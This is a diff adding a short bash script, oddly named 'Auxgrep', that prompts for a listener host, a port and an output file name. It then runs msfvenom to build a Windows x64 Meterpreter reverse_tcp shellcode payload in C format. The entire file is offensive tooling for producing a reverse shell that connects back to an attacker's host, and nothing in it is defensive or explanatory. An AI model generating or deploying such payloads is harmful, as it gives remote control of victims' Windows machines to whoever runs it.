@@ -1,0 +1,12 @@
+#!/usr/bin/bash
+#Auxgrep
+
+read -p 'lhost: ' host
+read -p 'port: ' port
+read -p 'outputName: ' final
+
+sleep 2
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f c > $final
+
+exit 0
